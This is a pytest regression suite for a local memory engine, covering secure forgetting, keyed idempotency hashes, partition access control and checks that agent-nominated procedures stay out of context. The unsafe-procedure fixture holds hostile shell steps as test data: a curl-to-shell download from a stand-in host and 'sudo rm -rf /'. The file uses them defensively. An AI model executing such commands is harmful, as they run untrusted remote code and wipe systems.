"""Regression tests for review group 1 (reproduced defects across core, forgetting, storage,
history, context, providers, learning, repository, compat and migrations).

Each test reproduces a defect report's scenario and asserts the secure / correct outcome.
All data lives in pytest tmp dirs.
"""
from __future__ import annotations

import dataclasses
import functools
import hashlib
import shutil
import sqlite3
import threading
import time
from pathlib import Path

import pytest

from conftest import access_for
from foundation_support import db_path, raw_db
from locus_memory import MemoryEngine
from locus_memory.errors import (
    AccessDenied,
    Contention,
    IntegrityError,
    NotFound,
    SuppressedError,
)
from locus_memory.history import archive as archive_mod
from locus_memory.host import EngineConfig
from locus_memory.models import (
    ContextRequest,
    ForgetPolicy,
    ForgetTarget,
    IngestionEvent,
    Operation,
    Query,
    RememberRequest,
    ResultStatus,
    Scope,
    SourceKind,
    SourceRef,
    canonical_json,
    content_hash,
)
from locus_memory.storage import ledger as ledger_mod

P1 = Scope.of(project="P1")
P2 = Scope.of(project="P2")
DOC1 = SourceRef(SourceKind.DOCUMENT, "doc-1")


def _ingest(engine, access, session, seq, text, scope, clock):
    return engine.ingest_event(access, IngestionEvent(
        event_id=f"{session}-e{seq}", session_ref=session, sequence=seq, role="user", text=text,
        occurred_at=clock(), scope=scope))


# =========================================================================== idempotency (storage)
def _idempotency_rows(root, access):
    with raw_db(db_path(root, access)) as conn:
        return [dict(r) for r in conn.execute("SELECT * FROM idempotency")]


def test_idempotency_request_hash_is_keyed_and_detached_after_forget(engine, root, user_access):
    request = RememberRequest(content="my bank PIN is 4821", scope=Scope.of(project="proj-a"))
    created = engine.remember(user_access, request, idempotency_key="k-1")
    stored = {row["request_hash"] for row in _idempotency_rows(root, user_access)}
    # An unkeyed sha256 of the request (computable by anyone holding the file) is never stored.
    assert content_hash(request) not in stored
    assert hashlib.sha256(canonical_json(request).encode()).hexdigest() not in stored

    engine.forget(user_access, ForgetTarget("memory", created.record.id), idempotency_key="f-1")
    with raw_db(db_path(root, user_access)) as conn:
        assert conn.execute("SELECT COUNT(*) FROM idempotency_records WHERE record_id=?",
                            (created.record.id,)).fetchone()[0] == 0
        receipt_ids = {r[0] for r in conn.execute("SELECT receipt_id FROM idempotency WHERE operation='remember'")}
    assert receipt_ids == {""}  # no row maps to the forgotten record any more
    with pytest.raises(NotFound):  # the retry still answers "no longer exists"
        engine.remember(user_access, request, idempotency_key="k-1")
    # Offline brute force over a small candidate space finds nothing.
    guesses = [RememberRequest(content=f"my bank PIN is {n:04d}", scope=Scope.of(project="proj-a"))
               for n in range(4800, 4900)]
    stored = {row["request_hash"] for row in _idempotency_rows(root, user_access)}
    assert not stored & {content_hash(g) for g in guesses}


def test_forgotten_project_name_is_not_confirmable_from_idempotency(engine, root, user_access):
    admin = access_for(projects=("acme-merger",))
    engine.remember(admin, RememberRequest(content="merger notes", scope=Scope.of(project="acme-merger")))
    engine.forget(admin, ForgetTarget("project", "acme-merger"), policy=ForgetPolicy(), idempotency_key="f-proj")
    oracle = content_hash([ForgetTarget("project", "acme-merger"), ForgetPolicy()])
    assert oracle not in {row["request_hash"] for row in _idempotency_rows(root, admin)}


def test_request_hash_depends_on_the_partition_key(make_engine, tmp_path, keys):
    from locus_memory import StaticKeyProvider

    request = RememberRequest(content="identical request", scope=Scope.of(project="proj-a"))
    access = access_for(projects=("proj-a",))
    hashes = []
    for name in ("one", "two"):
        root = tmp_path / name
        engine = make_engine(root_dir=root, key_provider=StaticKeyProvider({"k1": bytes([len(name)]) * 32}))
        engine.remember(access, request, idempotency_key="same")
        hashes.append(_idempotency_rows(root, access)[0]["request_hash"])
    assert hashes[0] != hashes[1]


def test_legacy_unkeyed_idempotency_rows_are_dropped_on_open(make_engine, root, user_access, keys):
    engine = make_engine()
    engine.remember(user_access, RememberRequest(content="x", scope=Scope.of(project="proj-a")),
                    idempotency_key="old")
    engine.close()
    with raw_db(db_path(root, user_access)) as conn:  # simulate a store written by an older build
        conn.execute("DELETE FROM meta WHERE key='idempotency_format'")
        conn.execute("UPDATE idempotency SET request_hash='deadbeef'")
    reopened = make_engine()
    reopened.status(user_access)
    assert _idempotency_rows(root, user_access) == []


# =========================================================================== forget replay authz
def test_forget_idempotency_replay_requires_authorization_and_is_caller_bound(engine):
    admin = access_for(projects=("P1", "P2"), principal="admin-A")
    narrow = access_for(projects=("P1",), operations={Operation.READ, Operation.FORGET}, principal="user-B")
    for i in range(3):
        engine.remember(admin, RememberRequest(content=f"p2 fact {i}", scope=P2))
    first = engine.forget(admin, ForgetTarget("project", "P2"), idempotency_key="forget-P2")
    assert first.deleted.get("memories") == 3
    with pytest.raises(AccessDenied):
        engine.forget(narrow, ForgetTarget("project", "P2"), idempotency_key="forget-P2")
    # The same caller retrying its own key still gets its own receipt.
    again = engine.forget(admin, ForgetTarget("project", "P2"), idempotency_key="forget-P2")
    assert again.receipt.idempotent_replay and again.receipt.receipt_id == first.receipt.receipt_id
    # A memory-target receipt is not replayed to a different principal either.
    record = engine.remember(admin, RememberRequest(content="p1 fact", scope=P1)).record
    mine = engine.forget(admin, ForgetTarget("memory", record.id), idempotency_key="m-1")
    with pytest.raises(NotFound):
        engine.forget(narrow, ForgetTarget("memory", record.id), idempotency_key="m-1")
    assert engine.forget(admin, ForgetTarget("memory", record.id),
                         idempotency_key="m-1").receipt.receipt_id == mine.receipt.receipt_id


# =========================================================================== orphan ledger
def test_missing_database_next_to_a_ledger_is_refused_without_new_keys(make_engine, root, keys, clock,
                                                                      user_access, tmp_path):
    engine = make_engine()
    keep = engine.remember(user_access, RememberRequest(content="survivor", scope=Scope.of(project="proj-a"))).record
    gone = engine.remember(user_access, RememberRequest(content="forgotten", scope=Scope.of(project="proj-a"))).record
    engine.forget(user_access, ForgetTarget("memory", gone.id))
    engine.close()
    main = db_path(root, user_access)
    aside = tmp_path / "aside"
    aside.mkdir()
    for suffix in ("", "-wal", "-shm"):
        source = Path(str(main) + suffix)
        if source.exists():
            shutil.move(str(source), aside / (main.name + suffix))
    for _ in range(2):
        fresh = MemoryEngine(root, keys)
        with pytest.raises(IntegrityError):
            fresh.status(user_access)
        fresh.close()
        assert not main.exists()  # nothing keyed was left behind
    for suffix in ("", "-wal", "-shm"):
        moved = aside / (main.name + suffix)
        if moved.exists():
            shutil.move(str(moved), Path(str(main) + suffix))
    restored = make_engine()
    assert [r.id for r in restored.list(user_access)] == [keep.id]


# =========================================================================== checkpoint with a reader
def test_forget_with_a_concurrent_reader_finishes_the_physical_purge_later(make_engine, root, user_access):
    engine = make_engine(config=EngineConfig(busy_timeout_ms=200))
    record = engine.remember(user_access, RememberRequest(content="secret to forget " * 8,
                                                          scope=Scope.of(project="proj-a"))).record
    ctx = engine.partition_context(user_access.partition)
    assert ctx.partition.db.checkpoint()
    path = db_path(root, user_access)
    with raw_db(path) as conn:
        blob = bytes(conn.execute("SELECT ciphertext FROM records WHERE id=?", (record.id,)).fetchone()[0])
    assert blob[:48] in path.read_bytes()
    reader = sqlite3.connect(path, isolation_level=None)
    reader.execute("BEGIN")
    reader.execute("SELECT COUNT(*) FROM records").fetchone()
    try:
        receipt = engine.forget(user_access, ForgetTarget("memory", record.id))
    finally:
        reader.execute("COMMIT")
        reader.close()
    assert receipt.deleted.get("memories") == 1
    # Honest receipt: the purge is committed, the on-disk scrub is pending.
    assert receipt.physical_purge_pending is True
    assert any("checkpoint" in note for note in receipt.receipt.limitations)
    assert ctx.partition.pending_purge_checkpoint
    engine.list(user_access)  # any later call retries the pending checkpoint
    assert not ctx.partition.pending_purge_checkpoint
    wal = Path(str(path) + "-wal")
    assert blob[:48] not in path.read_bytes()
    assert not wal.exists() or blob[:48] not in wal.read_bytes()


def test_forget_without_readers_reports_no_pending_purge(engine, user_access):
    record = engine.remember(user_access, RememberRequest(content="plain", scope=Scope.of(project="proj-a"))).record
    assert engine.forget(user_access, ForgetTarget("memory", record.id)).physical_purge_pending is False


# =========================================================================== session forget authz
def test_forgetting_an_unknown_session_needs_admin_and_is_not_an_oracle(engine, clock):
    p1 = access_for(projects=("P1",), operations={Operation.READ, Operation.FORGET})
    p2 = access_for(projects=("P2",))
    with pytest.raises(AccessDenied) as unknown:
        engine.forget(p1, ForgetTarget("session", "sess-future-p2"))
    # A later P2 session with that ref is archived normally (nothing was pre-suppressed).
    stored = _ingest(engine, p2, "sess-future-p2", 0, "important", P2, clock)
    assert stored.skipped_reason is None and stored.message_id
    assert engine.search_history(p2, "important").hits
    # Hidden and nonexistent sessions give the same answer.
    with pytest.raises(AccessDenied) as hidden:
        engine.preview_forget(p1, ForgetTarget("session", "sess-future-p2"))
    with pytest.raises(AccessDenied) as missing:
        engine.preview_forget(p1, ForgetTarget("session", "sess-nope"))
    assert str(hidden.value) == str(missing.value) == str(unknown.value)
    # An admin may still pre-forget an unknown session (host purge / replay).
    admin = access_for(projects=("P1",))
    assert engine.forget(admin, ForgetTarget("session", "sess-admin-only")).receipt.status == "ok"


# =========================================================================== retry after contention
def _hold_write_lock(path):
    blocker = sqlite3.connect(path, isolation_level=None, timeout=0.1)
    blocker.execute("BEGIN IMMEDIATE")
    return blocker


def test_forget_retry_after_contention_returns_the_real_receipt(make_engine, root, user_access):
    engine = make_engine(config=EngineConfig(busy_timeout_ms=50))
    record = engine.remember(user_access, RememberRequest(content="forget under contention",
                                                          scope=Scope.of(project="proj-a"))).record
    blocker = _hold_write_lock(db_path(root, user_access))
    try:
        with pytest.raises(Contention):
            engine.forget(user_access, ForgetTarget("memory", record.id), idempotency_key="k")
    finally:
        blocker.execute("ROLLBACK")
        blocker.close()
    retry = engine.forget(user_access, ForgetTarget("memory", record.id), idempotency_key="k")
    assert retry.deleted.get("memories") == 1 and retry.suppressed_sources >= 1
    with pytest.raises(NotFound):
        engine.get(user_access, record.id)
    assert len(engine.partition_context(user_access.partition).partition.ledger.since(0)) == 1


def test_session_forget_retry_after_contention_appends_one_entry(make_engine, root, user_access, clock):
    engine = make_engine(config=EngineConfig(busy_timeout_ms=50))
    _ingest(engine, user_access, "sess-1", 0, "tea", Scope.of(project="proj-a"), clock)
    engine.remember(user_access, RememberRequest(content="drinks tea", scope=Scope.of(project="proj-a"),
                                                 sources=(SourceRef(SourceKind.SESSION, "sess-1"),)))
    blocker = _hold_write_lock(db_path(root, user_access))
    try:
        with pytest.raises(Contention):
            engine.forget(user_access, ForgetTarget("session", "sess-1"), idempotency_key="s")
    finally:
        blocker.execute("ROLLBACK")
        blocker.close()
    retry = engine.forget(user_access, ForgetTarget("session", "sess-1"), idempotency_key="s")
    assert retry.deleted.get("memories") == 1
    assert len(engine.partition_context(user_access.partition).partition.ledger.since(0)) == 1


# =========================================================================== reconcile stealing a forget
def test_concurrent_reconcile_does_not_empty_the_forget_receipt(engine, user_access, monkeypatch):
    rec = engine.remember(user_access, RememberRequest(content="target fact", scope=Scope.of(project="proj-a"),
                                                       sources=(DOC1,))).record
    other = engine.remember(user_access, RememberRequest(content="other fact", scope=Scope.of(project="proj-a"),
                                                         sources=(DOC1,))).record
    original = ledger_mod.DeletionLedger.append
    workers: list[threading.Thread] = []

    def append_then_race(self, entries, **kwargs):
        out = original(self, entries, **kwargs)
        worker = threading.Thread(target=lambda: engine.get(user_access, other.id))
        workers.append(worker)
        worker.start()
        worker.join(timeout=0.5)  # an in-process reconcile must wait for the forget, not apply it
        return out

    monkeypatch.setattr(ledger_mod.DeletionLedger, "append", append_then_race)
    receipt = engine.forget(user_access, ForgetTarget("memory", rec.id))
    # The racing read finishes after the forget; it must end before the engine fixture closes
    # the connections it is using.
    for worker in workers:
        worker.join(30)
        assert not worker.is_alive()
    assert receipt.deleted.get("memories") == 1 and receipt.suppressed_sources == 1


def test_receipt_recorded_when_another_process_applies_the_entry(make_engine, user_access, monkeypatch):
    # Two engines on one root model two processes: B reconciles A's entry between A's append and
    # A's apply; A still returns the real counts (recorded by B on A's behalf).
    a = make_engine()
    b = make_engine()
    rec = a.remember(user_access, RememberRequest(content="cross process", scope=Scope.of(project="proj-a"),
                                                  sources=(DOC1,))).record
    b.status(user_access)
    ledger_a = a.partition_context(user_access.partition).partition.ledger
    original = ledger_a.append

    def append_then_reconcile(*args, **kwargs):
        out = original(*args, **kwargs)
        b.status(user_access)  # B sees the ledger ahead of its store and applies the entry
        return out

    monkeypatch.setattr(ledger_a, "append", append_then_reconcile)
    receipt = a.forget(user_access, ForgetTarget("memory", rec.id))
    assert receipt.deleted.get("memories") == 1 and receipt.suppressed_sources == 1
    assert not receipt.receipt.idempotent_replay


# =========================================================================== services bound to partition
def test_services_reject_an_access_context_of_another_partition(engine):
    personal = access_for(profile="personal")
    work = access_for(profile="work")
    record = engine.remember(personal, RememberRequest(content="vacation plan zanzibar")).record
    svc = engine.services(personal)
    with pytest.raises(AccessDenied):
        svc.core.get(work, record.id)
    with pytest.raises(AccessDenied):
        svc.core.list(work)
    with pytest.raises(AccessDenied):
        svc.retrieval.search(work, Query(text="zanzibar"))
    with pytest.raises(AccessDenied):
        svc.core.remember(work, RememberRequest(content="work-only note quokka"))
    with pytest.raises(AccessDenied):
        svc.forgetting.forget(work, ForgetTarget("memory", record.id), ForgetPolicy())
    with pytest.raises(AccessDenied):
        svc.history.search(work, "zanzibar")
    with pytest.raises(AccessDenied):
        svc.episodes.list(work)
    with pytest.raises(AccessDenied):
        svc.procedures.list(work)
    with pytest.raises(AccessDenied):
        svc.providers.status(work)
    with pytest.raises(AccessDenied):
        svc.consolidation.maintain(work)
    assert [r.content for r in engine.list(personal)] == ["vacation plan zanzibar"]
    assert engine.list(work) == []


# =========================================================================== profile forget keeps suppressions
def test_profile_forget_keeps_earlier_session_and_memory_suppressions(engine, clock):
    access = access_for(projects=("P1",))
    events = {}
    events["s0"] = IngestionEvent(event_id="s0-e0", session_ref="s0", sequence=0, role="user",
                                  text="private s0", occurred_at=clock(), scope=P1)
    engine.ingest_event(access, events["s0"])
    engine.forget(access, ForgetTarget("session", "s0"))
    assert engine.ingest_event(access, events["s0"]).skipped_reason == "forgotten"
    memory = engine.remember(access, RememberRequest(content="lives in Lisbon", scope=P1, sources=(DOC1,))).record
    engine.forget(access, ForgetTarget("memory", memory.id))
    s1 = IngestionEvent(event_id="s1-e0", session_ref="s1", sequence=0, role="user", text="other session",
                        occurred_at=clock(), scope=P1)
    engine.ingest_event(access, s1)
    engine.forget(access, ForgetTarget("profile", "default"))
    assert engine.ingest_event(access, events["s0"]).skipped_reason == "forgotten"
    assert engine.ingest_event(access, s1).skipped_reason is None  # a fresh start for the rest
    from locus_memory.models import CandidateProposal

    with pytest.raises(SuppressedError):
        engine.propose(access, CandidateProposal(content="lives in Lisbon", sources=(DOC1,), scope=P1))


def test_session_tombstone_blocks_replay_even_without_the_suppression_row(engine, root, clock):
    access = access_for(projects=("P1",))
    event = IngestionEvent(event_id="e0", session_ref="sess-t", sequence=0, role="user", text="gone",
                           occurred_at=clock(), scope=P1)
    engine.ingest_event(access, event)
    engine.forget(access, ForgetTarget("session", "sess-t"))
    with raw_db(db_path(root, access)) as conn:  # e.g. a restored backup without the row
        conn.execute("DELETE FROM history_suppressed")
    assert engine.ingest_event(access, event).skipped_reason == "forgotten"


# =========================================================================== history livelock
def test_history_search_completes_while_a_chat_keeps_ingesting(make_engine, clock, monkeypatch):
    engine = make_engine(config=EngineConfig(history_hydration_batch=5))
    access = access_for(projects=("p",))
    for seq in range(30):
        _ingest(engine, access, "bulk", seq, "deploys" if seq % 3 == 0 else f"chatter {seq}", Scope.of(project="p"),
                clock)
    original = archive_mod.HistoryArchive._hydrate_batch
    live = iter(range(1000))

    def hydrate_with_live_chat(self, *args, **kwargs):
        seq = next(live)
        worker = threading.Thread(target=_ingest, args=(engine, access, "live", seq, f"live deploys {seq}",
                                                         Scope.of(project="p"), clock))
        worker.start()
        worker.join()
        return original(self, *args, **kwargs)

    monkeypatch.setattr(archive_mod.HistoryArchive, "_hydrate_batch", hydrate_with_live_chat)
    for _ in range(3):
        result = engine.search_history(access, "deploys")
        assert result.status != ResultStatus.UNAVAILABLE and result.hits
    # Deadline-bounded searches make monotone progress instead of restarting from scratch.
    fresh = make_engine(config=EngineConfig(history_hydration_batch=5), root_dir=engine.root)
    searched = []
    for _ in range(4):
        partial = fresh.search_history(access, "deploys", deadline_ms=1)
        searched.append(partial.coverage.searched)
    assert searched == sorted(searched) and searched[-1] > searched[0]
    # A history-backed context build does not livelock either.
    packet = engine.build_context(access, ContextRequest(token_allowance=500, query="deploys",
                                                         include_history=True))
    assert packet.history_handles


def test_unrelated_remember_does_not_discard_the_history_projection(engine, clock):
    access = access_for(projects=("p", "other"))
    for seq in range(5):
        _ingest(engine, access, "s", seq, f"needle {seq}", Scope.of(project="p"), clock)
    engine.search_history(access, "needle")
    hydrated = engine.services(access).history.coverage_status(access)["hydrated"]
    engine.remember(access, RememberRequest(content="unrelated", scope=Scope.of(project="other")))
    assert engine.services(access).history.coverage_status(access)["hydrated"] == hydrated == 5


# =========================================================================== forget vs hydrating search
def test_forget_never_waits_for_a_hydrating_search_under_the_write_lock(make_engine, root, clock, monkeypatch):
    engine = make_engine(config=EngineConfig(busy_timeout_ms=200, history_hydration_batch=2))
    other = make_engine(config=EngineConfig(busy_timeout_ms=200))
    access = access_for(projects=("proj-a",))
    for seq in range(6):
        _ingest(engine, access, "s1", seq, f"deploys {seq}", Scope.of(project="proj-a"), clock)
        _ingest(engine, access, "s3", seq, f"other {seq}", Scope.of(project="proj-a"), clock)
    original = archive_mod.HistoryArchive._hydrate_batch
    entered = threading.Event()
    release = threading.Event()

    def slow_batch(self, *args, **kwargs):
        entered.set()
        release.wait(5)
        return original(self, *args, **kwargs)

    monkeypatch.setattr(archive_mod.HistoryArchive, "_hydrate_batch", slow_batch)
    results = {}
    searcher = threading.Thread(target=lambda: results.setdefault("search", engine.search_history(access, "deploys")))
    searcher.start()
    assert entered.wait(5)
    started = time.monotonic()
    receipt = engine.forget(access, ForgetTarget("session", "s3"))
    assert time.monotonic() - started < 3 and receipt.deleted.get("messages") == 6
    other.remember(access, RememberRequest(content="written meanwhile", scope=Scope.of(project="proj-a")))
    release.set()
    searcher.join(10)
    assert results["search"].status != ResultStatus.UNAVAILABLE
    assert all(hit.message.session_ref == "s1" for hit in results["search"].hits)


# =========================================================================== core: basis, kinds, scope
from locus_memory.errors import (  # noqa: E402
    ConsentRequired,
    InvalidTransition,
    RevisionConflict,
    SensitiveContent,
    StaleDerivation,
    ValidationError,
)
from locus_memory.models import (  # noqa: E402
    Actor,
    CandidateProposal,
    Correction,
    Lifecycle,
    MemoryKind,
    ProcedureDraft,
    Retention,
    StatementBasis,
    Validity,
)

AGENT_P = access_for(actor=Actor.AGENT, projects=("proj-a",), operations={Operation.READ, Operation.PROPOSE})
USER_P = access_for(projects=("proj-a",))
PROJ_A = Scope.of(project="proj-a")


def _ctx(engine, access):
    return engine.partition_context(access.partition)


def test_agent_cannot_assert_user_stated_basis(engine):
    m0 = engine.remember(USER_P, RememberRequest(content="evidence fact", scope=PROJ_A)).record
    evidence = (SourceRef(SourceKind.MEMORY, m0.id),)
    with pytest.raises(SensitiveContent):  # the claimed basis no longer skips the inference gate
        engine.propose(AGENT_P, CandidateProposal(
            content="The user was diagnosed with a disorder and takes medication", sources=evidence,
            scope=PROJ_A, basis=StatementBasis.USER_STATED))
    claimed = engine.propose(AGENT_P, CandidateProposal(content="BLUEFIN acquisition closes in March",
                                                         sources=evidence, scope=PROJ_A,
                                                         basis=StatementBasis.OBSERVED)).record
    assert claimed.basis == StatementBasis.MODEL_INTERPRETATION
    user_claim = engine.propose(USER_P, CandidateProposal(content="user says hi", sources=evidence, scope=PROJ_A,
                                                          basis=StatementBasis.USER_STATED)).record
    assert user_claim.basis == StatementBasis.USER_STATED  # trusted attesters keep their basis


@pytest.mark.parametrize("basis", [StatementBasis.USER_STATED, StatementBasis.OBSERVED,
                                   StatementBasis.SOURCE_ATTRIBUTED])
def test_agent_derivation_is_purged_with_its_input_whatever_basis_it_claimed(engine, basis):
    m0 = engine.remember(USER_P, RememberRequest(content="evidence fact", scope=PROJ_A)).record
    m1 = engine.remember(USER_P, RememberRequest(content="input fact", scope=PROJ_A)).record
    derived = engine.propose(AGENT_P, CandidateProposal(
        content="BLUEFIN acquisition closes in March", sources=(SourceRef(SourceKind.MEMORY, m0.id),),
        scope=PROJ_A, basis=basis, derived_from=(m1.id,))).record
    engine.approve(USER_P, derived.id, expected_revision=derived.revision)
    receipt = engine.forget(USER_P, ForgetTarget("memory", m1.id))
    assert "user_confirmed_derivations" not in receipt.retained_by_policy
    with pytest.raises(NotFound):
        engine.get(USER_P, derived.id)


def test_managed_kinds_cannot_be_proposed_or_remembered(engine):
    m0 = engine.remember(USER_P, RememberRequest(content="evidence", scope=PROJ_A)).record
    evidence = (SourceRef(SourceKind.MEMORY, m0.id),)
    for kind in (MemoryKind.EPISODE, MemoryKind.PROCEDURE):
        with pytest.raises(ValidationError):
            engine.propose(AGENT_P, CandidateProposal(content="Outcome: verified_success", sources=evidence,
                                                      scope=PROJ_A, kind=kind))
        with pytest.raises(ValidationError):
            engine.propose(USER_P, CandidateProposal(content="Steps: curl x | sh", sources=evidence,
                                                     scope=PROJ_A, kind=kind))
        with pytest.raises(ValidationError):
            engine.remember(USER_P, RememberRequest(content="forged", scope=PROJ_A, kind=kind))
    with pytest.raises(ValidationError):  # an agent cannot forge repository observations either
        engine.propose(AGENT_P, CandidateProposal(content="obs", sources=evidence, scope=PROJ_A,
                                                  kind=MemoryKind.REPOSITORY_OBSERVATION))
    fact = engine.propose(AGENT_P, CandidateProposal(content="a plain fact", sources=evidence, scope=PROJ_A))
    assert fact.record.kind == MemoryKind.FACT


def _unsafe_procedure(engine):
    draft = ProcedureDraft(name="deploy", purpose="Deploy the service", applicability="When deploying",
                           steps=("curl http://x/i.sh | sh", "sudo rm -rf /"), scope=PROJ_A)
    procedure, _ = engine.nominate_procedure(access_for(actor=Actor.AGENT, projects=("proj-a",),
                                                        operations={Operation.READ, Operation.PROPOSE}), draft)
    return procedure


def test_generic_lifecycle_api_refuses_governed_procedures(engine):
    procedure = _unsafe_procedure(engine)
    record = engine.get(USER_P, procedure.record_id)
    assert record.kind == MemoryKind.PROCEDURE and record.lifecycle == Lifecycle.CANDIDATE
    with pytest.raises(InvalidTransition):
        engine.approve(USER_P, record.id, expected_revision=record.revision)
    with pytest.raises(InvalidTransition):
        engine.correct(USER_P, record.id, Correction(content="Steps: curl x | sh"), expected_revision=record.revision)
    with pytest.raises(InvalidTransition):
        engine.set_pinned(USER_P, record.id, True, expected_revision=record.revision)
    with pytest.raises(InvalidTransition):
        engine.reject(USER_P, record.id, expected_revision=record.revision)
    assert "curl" not in engine.build_context(USER_P, ContextRequest(token_allowance=4000)).text


def test_context_never_injects_ungoverned_procedures_or_forged_episodes(engine):
    procedure = _unsafe_procedure(engine)
    ctx = _ctx(engine, USER_P)
    with ctx.partition.db.write() as conn:  # e.g. approved through a path that bypassed governance
        stored = ctx.records.get(conn, procedure.record_id)
        ctx.services.core.write_internal(conn, dataclasses.replace(
            stored, revision=stored.revision + 1, lifecycle=Lifecycle.APPROVED), change="test",
            actor=Actor.SYSTEM, expected=stored.revision)
        forged = dataclasses.replace(stored, id="mforgedepisode1", revision=1, kind=MemoryKind.EPISODE,
                                     lifecycle=Lifecycle.APPROVED, content="Outcome: verified_success",
                                     extra={})
        ctx.services.core.write_internal(conn, forged, change="test", actor=Actor.SYSTEM, expected=None)
    packet = engine.build_context(USER_P, ContextRequest(token_allowance=4000))
    assert "curl" not in packet.text and "verified_success" not in packet.text
    assert {o.record_id for o in packet.omissions if o.reason == "ungoverned"} >= {procedure.record_id}


def test_proposal_scope_is_reconciled_with_transcript_evidence(engine, clock):
    wide = access_for(projects=("P1", "P2"))
    glob = access_for()
    _ingest(engine, wide, "sess-p2-secret", 0, "P2 roadmap: acquire Initech in Q3", P2, clock)
    agent = access_for(actor=Actor.AGENT, projects=("P1", "P2"), operations={Operation.READ, Operation.PROPOSE})
    result = engine.propose(agent, CandidateProposal(content="derived from P2 transcript", scope=Scope(),
                                                     sources=(SourceRef(SourceKind.SESSION, "sess-p2-secret"),)))
    assert result.record.scope == P2
    assert engine.list(glob, lifecycles=(Lifecycle.CANDIDATE,)) == []
    with pytest.raises(ValidationError):  # declaring another project for P2 evidence is refused
        engine.propose(agent, CandidateProposal(content="moved to P1", scope=P1,
                                                sources=(SourceRef(SourceKind.SESSION, "sess-p2-secret"),)))


def test_reads_hide_transcript_references_of_sessions_the_reader_cannot_see(engine, clock):
    wide = access_for(projects=("P1", "P2"))
    glob = access_for()
    _ingest(engine, wide, "sess-p2-secret", 0, "P2 secret", P2, clock)
    record = engine.remember(glob, RememberRequest(content="global note")).record
    ctx = _ctx(engine, glob)
    with ctx.partition.db.write() as conn:  # a record from an older build citing a P2 session
        stored = ctx.records.get(conn, record.id)
        ctx.services.core.write_internal(conn, dataclasses.replace(
            stored, revision=stored.revision + 1,
            sources=stored.sources + (SourceRef(SourceKind.SESSION, "sess-p2-secret"),)),
            change="test", actor=Actor.SYSTEM, expected=stored.revision)
    assert "session:sess-p2-secret" not in [s.identity() for s in engine.get(glob, record.id).sources]
    assert "session:sess-p2-secret" in [s.identity() for s in engine.get(wide, record.id).sources]


def test_hub_extraction_narrows_to_the_transcript_scope_before_egress(make_engine, clock):
    from locus_memory.host import HostCapabilities
    from locus_memory.providers.base import DATA_TRANSCRIPTS, ConsentGrant, StaticConsentPolicy
    from locus_memory.providers.fake import FakeExtractor

    local = FakeExtractor("local-extract")
    cloud = FakeExtractor("cloud-extract", egress=True)
    consent = StaticConsentPolicy([ConsentGrant(provider="cloud-extract", scope=P1,
                                                data_classes=frozenset({DATA_TRANSCRIPTS}), granted_at=clock() - 1)])
    engine = make_engine(host=HostCapabilities(clock=clock, consent=consent,
                                               providers={"local-extract": local, "cloud-extract": cloud}))
    wide = access_for(projects=("P1", "P2"))
    message = _ingest(engine, wide, "sess-p2", 0, "P2 roadmap: acquire Initech in Q3", P2, clock).message_id
    hub = engine.services(wide).providers

    def evidence(scope):
        return [{"id": "e1", "text": "P2 roadmap: acquire Initech in Q3", "data_class": DATA_TRANSCRIPTS,
                 "source": SourceRef(SourceKind.MESSAGE, message), "scope": scope.as_dict()}]

    created = hub.extract_candidates(wide, evidence(Scope()), provider="local-extract")
    assert [r.record.scope for r in created] == [P2]
    with pytest.raises((ValidationError, ConsentRequired)):  # P1 consent cannot cover a P2 transcript
        hub.extract_candidates(wide, evidence(P1), provider="cloud-extract")
    assert cloud.calls == []  # nothing left the process


# =========================================================================== approve / revert / retention
def test_supersede_retires_only_the_conflicts_the_reviewer_saw(engine):
    a = engine.remember(USER_P, RememberRequest(content="Deploy target is staging-1", scope=PROJ_A,
                                                subject="deploy", predicate="target")).record
    c = engine.propose(USER_P, CandidateProposal(content="Deploy target is staging-2", scope=PROJ_A, sources=(DOC1,),
                                                 subject="deploy", predicate="target")).record
    assert c.links.conflicts_with == (a.id,)
    d = engine.remember(USER_P, RememberRequest(content="Deploy target is prod-3 (moved today)", scope=PROJ_A,
                                                subject="deploy", predicate="target")).record
    with pytest.raises(RevisionConflict):  # an explicit reviewed set must match the current one
        engine.approve(USER_P, c.id, expected_revision=1, resolution="supersede", expected_conflicts=(a.id,))
    result = engine.approve(USER_P, c.id, expected_revision=1, resolution="supersede")
    assert result.receipt.details["superseded"] == [a.id]
    assert result.receipt.details["new_conflicts"] == [d.id]
    assert engine.get(USER_P, d.id).lifecycle == Lifecycle.APPROVED
    assert engine.get(USER_P, a.id).lifecycle == Lifecycle.SUPERSEDED


def test_reverting_a_superseded_memory_clears_both_links(engine):
    a = engine.remember(USER_P, RememberRequest(content="use tabs for indentation", scope=PROJ_A,
                                                kind=MemoryKind.PREFERENCE)).record
    b = engine.remember(USER_P, RememberRequest(content="use spaces for indentation", scope=PROJ_A,
                                                kind=MemoryKind.PREFERENCE)).record
    engine.supersede(USER_P, a.id, b.id, expected_revision=a.revision)
    reverted = engine.approve(USER_P, a.id, expected_revision=engine.get(USER_P, a.id).revision).record
    assert reverted.lifecycle == Lifecycle.APPROVED and reverted.links.superseded_by is None
    assert a.id not in engine.get(USER_P, b.id).links.supersedes
    packet = engine.build_context(USER_P, ContextRequest(token_allowance=4000))
    assert a.id in {item.record_id for item in packet.items}
    hits = {hit.record.id: hit.current for hit in engine.search(USER_P, Query(text="indentation")).hits}
    assert hits.get(a.id) is True


def test_reapproval_keeps_transient_retention(engine, clock):
    record = engine.remember(USER_P, RememberRequest(
        content="transient note", scope=PROJ_A, retention=Retention("transient", clock() + 100),
        validity=Validity(None, clock() + 50))).record
    clock.advance(60)
    engine.maintain(USER_P)
    stale = engine.get(USER_P, record.id)
    assert stale.lifecycle == Lifecycle.STALE
    again = engine.approve(USER_P, record.id, expected_revision=stale.revision).record
    assert again.retention.expires_at == record.retention.expires_at
    clock.advance(10_000)
    with pytest.raises(InvalidTransition):  # retention ended: never revived by a review
        engine.approve(USER_P, record.id, expected_revision=engine.get(USER_P, record.id).revision)
    engine.maintain(USER_P)
    assert engine.get(USER_P, record.id).lifecycle == Lifecycle.EXPIRED
    candidate = engine.propose(USER_P, CandidateProposal(content="a candidate", scope=PROJ_A, sources=(DOC1,))).record
    assert candidate.retention.expires_at is not None
    assert engine.approve(USER_P, candidate.id, expected_revision=1).record.retention.expires_at is None


def test_reverted_superseded_transient_keeps_its_expiry(engine, clock):
    old = engine.remember(USER_P, RememberRequest(content="old transient", scope=PROJ_A,
                                                  retention=Retention("transient", clock() + 100))).record
    new = engine.remember(USER_P, RememberRequest(content="new", scope=PROJ_A)).record
    engine.supersede(USER_P, old.id, new.id, expected_revision=old.revision)
    reverted = engine.approve(USER_P, old.id, expected_revision=engine.get(USER_P, old.id).revision).record
    assert reverted.retention.expires_at == clock() + 100


